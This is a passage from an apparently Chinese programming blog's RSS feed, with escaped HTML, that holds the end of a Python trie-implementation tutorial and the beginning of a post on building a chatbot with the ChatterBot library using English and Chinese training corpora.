    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Get branch matching the character&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;branch&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;_get_child_branches&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;branch&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;branch&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;_retrive_branch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Get branch matching the key word&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;child_branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;_get_child_branch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;child_branch&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
        &lt;span class="n"&gt;trie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;child_branch&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;trie&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;_is_trie_bucket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bucket&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bucket&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bucket&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="nb"&gt;tuple&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;_get_bucket_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bucket&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;_is_trie_bucket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bucket&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;bucket&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;has_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Check if trie contain the key word&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;_retrive_branch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;retrie_val&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;key_tuple&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;_retrive_branch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;key_tuple&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;key_tuple&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;insert_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Insert a (key, value) pair into trie&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="n"&gt;has_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;char&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;_get_child_branch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;branch&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;new_branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;new_branch&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;trie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new_branch&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;trie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;branch&lt;/span&gt;
    &lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;start_with_prefix&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prefix&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Find words start with prefix&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;_retrive_branch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prefix&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;branch&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;

    &lt;span class="n"&gt;prefix_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
    &lt;span class="n"&gt;q&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;branch&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;curr_branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;_is_trie_bucket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;curr_branch&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;prefix_list&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_get_bucket_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;curr_branch&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extend&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;curr_branch&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:])&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;prefix_list&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;使用&lt;/h5&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;trie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[[]]&lt;/span&gt;
&lt;span class="n"&gt;states&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;            Alabama&lt;/span&gt;
&lt;span class="s2"&gt;            Alaska&lt;/span&gt;
&lt;span class="s2"&gt;            Arizona&lt;/span&gt;
&lt;span class="s2"&gt;            Arkansas&lt;/span&gt;
&lt;span class="s2"&gt;            California&lt;/span&gt;
&lt;span class="s2"&gt;            Colorado&lt;/span&gt;
&lt;span class="s2"&gt;            Connecticu&lt;/span&gt;
&lt;span class="s2"&gt;            Hawaii&lt;/span&gt;
&lt;span class="s2"&gt;            Idaho&lt;/span&gt;
&lt;span class="s2"&gt;            Illinois&lt;/span&gt;
&lt;span class="s2"&gt;            Indiana&lt;/span&gt;
&lt;span class="s2"&gt;            Maine&lt;/span&gt;
&lt;span class="s2"&gt;            Maryland&lt;/span&gt;
&lt;span class="s2"&gt;            Massachusetts&lt;/span&gt;
&lt;span class="s2"&gt;            Michigan&lt;/span&gt;
&lt;span class="s2"&gt;            Minnesota&lt;/span&gt;
&lt;span class="s2"&gt;            Mississippi&lt;/span&gt;
&lt;span class="s2"&gt;            Missouri&lt;/span&gt;
&lt;span class="s2"&gt;            Montana&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;states_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lower&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;states&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;splitlines&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;state&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;states_list&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;insert_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;state&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;start_with_prefix&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;new&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/Trie"&gt;wikipedia Trie&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.coursera.org/learn/gaoji-shuju-jiegou/lecture/1s2Nc/trie-shu"&gt;Trie 树- 北京大学| Coursera&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/julycoding/The-Art-Of-Programming-By-July/blob/master/ebook/zh/06.09.md"&gt;The-Art-Of-Programming Trie树（字典树）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/prakhar1989/Algorithms/blob/master/trees/trie.py"&gt;Algorithms trie（python）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 13 Aug 2016 00:00:00 +0000</pubDate><guid>tag:,2016-08-13:algorithm-trie.html</guid><category>algorithm</category></item><item><title>构建自己的智能聊天机器人</title><link>/create-a-smart-chat-bot.html</link><description>&lt;p&gt;(说明: 这篇文章读者较多，时常会收到邮件咨询问题， 大多是因为文章落后于源码库，我之后定期更新到最新源码库，大家之后发邮件,也麻烦注明使用的依赖库版本)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The answer to life, universe and everything is 42     --deepThought&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/bot1983acb5.png" /&gt;&lt;/p&gt;
&lt;p&gt;今年的F8 开发者大会,Facebook大谈他们看好聊天机器人的未来 。通过这些聊天机器人，用户可以在交谈中完成许多任务，在线购物，航班查询、组织会议等。如此一来，用户再不必下载一堆app,而只需打开一个简单的文本对话框，你就可以对着它说：神灯神灯，我的第三个愿望是我还要三个愿望&lt;/p&gt;
&lt;p&gt;你说不定想到了：hi siri&lt;/p&gt;
&lt;p&gt;说不定又是一次用户入口的重新洗牌，这样就不难解释科技界的大公司们蜂拥而至了&lt;/p&gt;
&lt;h1&gt;缘起&lt;/h1&gt;
&lt;p&gt;我一直对自然语言处理（NLP）兴致勃勃，这大半年对机器学习/深度学习兴致盎然，而聊天机器人恰好结合了两者。&lt;/p&gt;
&lt;p&gt;对聊天机器人最早的兴趣可能追溯到大学。当时关注过一段时间风靡人人网的小黄鸡，后来发现它只是调用了一个闭源的云服务，转而折腾AIML。&lt;/p&gt;
&lt;p&gt;最近下班后喜欢到星巴克看看课程（近期在跟udacity的这门课：&lt;a href="https://classroom.udacity.com/courses/ud730"&gt;Deep Learning&lt;/a&gt;），写写博客,今天也是如此，怕往后的时间会更多花在深度学习上（对RNN尤其感兴趣），这几天陆续对折腾过的聊天机器人做个笔记&lt;/p&gt;
&lt;h1&gt;聊天机器人 &amp;amp; 开源框架&lt;/h1&gt;
&lt;p&gt;目前聊天这块的云服务倒是不少，facebook也好微软也好，都有自己的框架。相比而言，开源的项目倒是没有很耀眼的，也许是起步不久的原因，大神们还在憋大招。&lt;/p&gt;
&lt;p&gt;我们到github逛一圈，发现&lt;a href="https://github.com/gunthercox/ChatterBot"&gt;ChatterBot&lt;/a&gt;看起来挺酷, 项目活跃, 文档清晰，代码也算干净利落。&lt;/p&gt;
&lt;p&gt;由于项目还小，源码读起来十分容易，作为构建自己的智能聊天机器人的脚手架是不错的&lt;/p&gt;
&lt;h1&gt;ChatterBot&lt;/h1&gt;
&lt;p&gt;ChatterBot是一个基于机器学习的聊天机器人引擎,构建在python上,可以&lt;code&gt;从已有的对话中学习&lt;/code&gt;, 该项目的设计允许它接入任何语言&lt;/p&gt;
&lt;h2&gt;原理&lt;/h2&gt;
&lt;p&gt;一个未经训练的ChatterBot机器人,并没有与用户交谈所需的知识。每当用户输入一句话，机器人将存下它，同时也存下答复的句子。 随着机器人接受的输入的增加，它能够回答的问题的数量和准确度都会相应提升.程序是如何响应用户输入的呢？首先从已知句子中匹配出与用户输入最相近的句子（如何衡量&lt;code&gt;相近&lt;/code&gt;, 大家可以想想）,之后找到最有可能的回复，那么如何得出&lt;code&gt;最有可能&lt;/code&gt;的回复呢？由所有和机器交流过的人们，对这个输入问题（匹配过的）的各个回答的频率决定&lt;/p&gt;
&lt;h2&gt;安装和使用&lt;/h2&gt;
&lt;h3&gt;安装&lt;/h3&gt;
&lt;p&gt;pip install chatterbot (我的当前版本是：chatterbot==0.5.4)&lt;/p&gt;
&lt;h3&gt;基本使用&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;chatterbot&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ChatBot&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;chatterbot.trainers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ChatterBotCorpusTrainer&lt;/span&gt;

&lt;span class="n"&gt;chatbot&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ChatBot&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;myBot&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;chatbot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_trainer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ChatterBotCorpusTrainer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# 使用英文语料库训练它&lt;/span&gt;
&lt;span class="n"&gt;chatbot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;train&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;chatterbot.corpus.english&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# 开始对话 &lt;/span&gt;
&lt;span class="n"&gt;chatbot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Hello, how are you today?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;采用中文语料库&lt;/h3&gt;
&lt;p&gt;我之前给这个项目添加了中文语料库,在新版本中可以直接使用&lt;/p&gt;
&lt;p&gt;使用中文语料库来训练机器人(仅支持python3)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;chatterbot&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ChatBot&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;chatterbot.trainers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ChatterBotCorpusTrainer&lt;/span&gt;
&lt;span class="n"&gt;deepThought&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ChatBot&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;deepThought&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;deepThought&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_trainer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ChatterBotCorpusTrainer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# 使用中文语料库训练它&lt;/span&gt;
&lt;span class="n"&gt;deepThought&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;train&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;chatterbot.corpus.chinese&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;# 语料库&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;------------更新于2016.08.30&lt;/p&gt;
&lt;p&gt;我今天在pypi上看到，0.4.6版本（08.14号上传）已经把中文预料库包含在内了，直接pip3 install ChatterBot就行&lt;/p&gt;
&lt;p&gt;------------更新于2017.1.4&lt;/p&gt;
&lt;p&gt;需要注意的是，python2中使用，不能直接用语料训练，需要手动训练&lt;/p&gt;
&lt;p&gt;参见FAQ中的 手动训练(手动训练可以直接在python2中使用中文)&lt;/p&gt;
&lt;h3&gt;开始玩耍&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;deepThought&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;很高兴认识你&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;deepThought&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;嗨，最近如何?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;deepThought&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;复杂优于晦涩&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="c1"&gt;#语出 The Zen of Python&lt;/span&gt;
